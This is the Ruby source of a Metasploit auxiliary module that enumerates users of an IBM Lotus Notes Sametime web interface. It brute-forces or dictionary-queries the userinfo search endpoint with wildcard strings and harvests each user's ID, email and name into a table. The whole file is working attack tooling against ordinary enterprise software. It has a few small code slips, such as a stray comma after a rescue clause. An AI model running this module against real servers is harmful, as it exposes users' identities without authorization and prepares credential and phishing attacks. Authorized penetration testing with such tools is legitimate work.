##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'enumerable'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IBM Lotus Notes Sametime User Enumeration',
      'Description'    => %q{
        This module extracts users using the IBM Lotus Notes Sametime web
        interface using either brute-force or dictionary based attack.
      },
      'Author'         =>
        [
          'kicks4kittens' # Metasploit module
        ],
      'DefaultOptions' =>
        {
          'SSL' => true
        },
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Dec 27 2013'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [ true, 'The path to the userinfo script', '/userinfo/search']),
         OptEnum.new('CHARSET', [true, 'Charset to use for enumeration', 'alpha', ['alpha', 'alphanum', 'num'] ]),
        OptEnum.new('TYPE', [true, 'Specify UID or EMAIL', 'UID', ['UID', 'EMAIL'] ]),
        OptPath.new('DICT', [ false,  'Path to dictionary file to use', '']),
        OptInt.new('MAXDEPTH', [ true,  'Maximum depth to check during brute-force', 2])
      ], self.class)

    register_advanced_options(
      [
        OptString.new('SpecialChars', [false, 'Specify special chars (e.g. -_+!@&$/\?)', '' ]),
        OptString.new('PREFIX', [ false,  'Defines set prefix for each guess (e.g. user)', '']),
        OptString.new('SUFFIX', [ false,  'Defines set post for each quess (e.g. _adm)', '']),
        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
        OptInt.new('Threads', [ true,  'Number of test threads', 10])
      ], self.class)
  end

  def setup
    # setup the desired charset
    @charset = []
    # setup array to hold user data
    @user_data = []

    if datastore['DICT'].blank?
      # populate charset - lowercase only as search is case insensitive
      case datastore['CHARSET']
      when "alpha"
        ("a".."z").each { |alpha| @charset.push(alpha) }
      when "num"
        ("0".."9").each { |num| @charset.push(num) }
      when "alphanum"
        ("a".."z").each { |alpha| @charset.push(alpha) }
        ("0".."9").each { |num| @charset.push(num) }
      end

      if datastore['SpecialChars']
        datastore['SpecialChars'].chars do | spec |
          @charset.push(Rex::Text.uri_encode(spec))
        end
      end
      print_status("#{peer} - Performing Brute-Force based attack")
      vprint_status("#{peer} - Using CHARSET: [#{@charset.join(",")}]")
    else
      print_status("#{peer} - Performing dictionary based attack (#{datastore['DICT']})")
    end

    if datastore['DICT'].blank? and datastore['MAXDEPTH'] > 2
      # warn user on long runs
      print_status("#{peer} - Depth level #{datastore['MAXDEPTH']} selected... this may take some time!")
    end

    # create initial test queue and populate
    @test_queue = Queue.new
    if datastore['DICT'].blank?
      @charset.each { |char| @test_queue.push(char) }
    else
      ::File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }
      vprint_status("#{peer} - Loaded #{@test_queue.length} values from dictionary")
    end

    @depth_warning = true
    @retries = []
  end

  def run
    print_status("#{peer} - Testing for IBM Lotus Notes Sametime User Enumeration flaw")

    # test for expected response code on non-existant uid/email
    if datastore['TYPE'] == "UID"
      random_val = Rex::Text.rand_text_alpha(32)
    else
      random_val = Rex::Text.rand_text_alpha(32) +"@"+ Rex::Text.rand_text_alpha(16) + ".com"
    end

    res = send_request_cgi({
      'uri'     =>  normalize_uri(target_uri.path),
      'method'  => 'GET',
      'ctype'   => 'text/html',
      'vars_get' => {
        'mode' => datastore['TYPE'].downcase,
        'searchText' => random_val
      }
    })

    begin
      if res.nil?
        print_error("#{peer} - Timeout")
        return
      elsif res.code != 200
        print_error("#{peer} - Unexpected response from server (Response code: #{res.code})")
        return
      elsif JSON.parse(res.body).blank?
        # empty JSON element - valid response for check
        print_good("#{peer} - Response received, continuing to enumeration phase")
      end
    rescue JSON::ParserError,
      print_error("#{peer} - Error parsing JSON: Invalid response from server")
      return
    end

    # start test handler
    test_handler

    # ouput results
    output_results
  end

  def test_handler
    print_status("#{peer} - Beginning tests using #{datastore['TYPE']} search method (#{datastore['Threads']} Threads)")
    test_length = 1 # initial test length set

    until @test_queue.empty?
      t = []
      nt = datastore['Threads'].to_i
      nt = 1 if nt == 0

      if @test_queue.length < nt
        # work around issue where threads not created as the queue isn't large enough
        nt = @test_queue.length
      end

      begin
        1.upto(nt) do
          t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, @test_queue.shift) do |test_current|
            Thread.current.kill if not test_current

            # provide feedback to user on current test length
            if datastore['DICT'].blank? and test_current.length > test_length
              test_length = test_current.length
              print_status("#{peer} - Beginning brute_force test for #{test_length} character strings")
            end

            res = make_request(test_current)

            # check response to see if an error was returned, if so wait 1 second and retry
            if res.nil? and not @retries.include?(test_current)
              # attempt test again as the server was too busy to respond
              # correctly - error returned
              print_error("#{peer} - Error reading JSON response, attempting to redo check for \"#{test_current}\"")
              @test_queue.push(test_current)
              @retries << test_current
              if @retries.length == 10
                print_error("#{peer} - Excessive number of retries detected (#{@retries.length}... check the TIMING and Threads options)")
              end
            elsif res
              # check response for user data
              check_response(res, test_current)
            end
          end
        end
      t.each {|x| x.join }

      rescue ::Timeout::Error
      ensure
        t.each {|x| x.kill rescue nil }
      end
    end
  end

  # make request and return response
  def make_request(test_current)
    # combine test string with PRE and POST variables
    tstring = datastore['PREFIX'] + test_current + datastore['SUFFIX'] + "*"
    # Apply timing information to pause between making requests - not a timeout
    if datastore['TIMING'] > 0
      Rex::sleep(datastore['TIMING'])
    end

    res = send_request_cgi({
      'uri'     =>  normalize_uri(target_uri.path),
      'method'  => 'GET',
      'ctype'   => 'text/html',
      'vars_get' => {
        'mode' => datastore['TYPE'].downcase,
        'searchText' => tstring
      }
    })
  end

  # check the response for valid user information
  def check_response(res, test_current)
    begin
      # check response exists AND that it validates as JSON before proceeding
      if res.code.to_i == 200 and not JSON.parse(res.body).blank?
        # successful response - extract user data
        extract_user(res)
        # extend test_queue to search for further data (not if dictionary in use)
        extend_queue(test_current) if (datastore['DICT'].blank?)
      end
    rescue JSON::ParserError
      # non-JSON response - server may be overloaded
      return error
    end
  end

  def extract_user(res)
    # extract user data if not already present
    begin
      userinfo = JSON.parse(res.body)
      unless @user_data.flatten.include?(userinfo['uid'])
        @user_data << [ userinfo['uid'], userinfo['mail'] || "-", userinfo['externalName'] || "-" ]
        # print newly discovered users straight to the screen if verbose mode is set
        vprint_good("#{peer} - New user found: #{userinfo['uid']}")
        report_user(userinfo['uid'])
      end
    rescue JSON::ParserError
      print_error("#{peer} - Error reading JSON string, continuing")
    end
  end

  # extend the test queue if MAXDEPTH value not exceeded
  # checks made to ensure duplicates are not created when extending
  # process:
  #
  # when a user is found searching for 'a' the queue for 'a' is extended as
  # only the first user starting with 'a' will be returned (e.g. 'aanderson')
  # To find all users the queue must be extended by adding 'aa' through to 'az'
  def extend_queue(test_current)
    if test_current.length < datastore['MAXDEPTH']
      @charset.each do | char |
        @test_queue.push(test_current + char)
      end
    elsif @depth_warning and test_current.length == datastore['MAXDEPTH'] and datastore['MAXDEPTH'] > 1
      vprint_status("#{peer} - Depth limit reached [#{datastore['MAXDEPTH']} levels deep] finishing up current tests")
      @depth_warning = false
    end
  end

  def report_user(username)
    report_note(
      :host   => rhost,
      :port   => rport,
      :proto  => 'tcp',
      :sname  => 'sametime',
      :type   => 'ibm_lotus_sametime_user',
      :data   => "#{username}",
      :update => :unique_data
    )
  end

  def output_results
    # print output table

    user_tbl = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header'  => "IBM Lotus Sametime Users",
      'Prefix'  => "\n",
      'Indent'  => 1,
      'Columns'   =>
      [
        "UID",
        "Email",
        "CommonName"
      ])

    # populate tables
    @user_data.each do | line |
      user_tbl << [ line[0], line[1], line[2] ]
    end

    if not user_tbl.to_s.empty?
      print_good("#{peer} - #{@user_data.length} users extracted")
      print_line(user_tbl.to_s)
    else
      print_error("#{peer} - No users discovered")
    end
  end

end
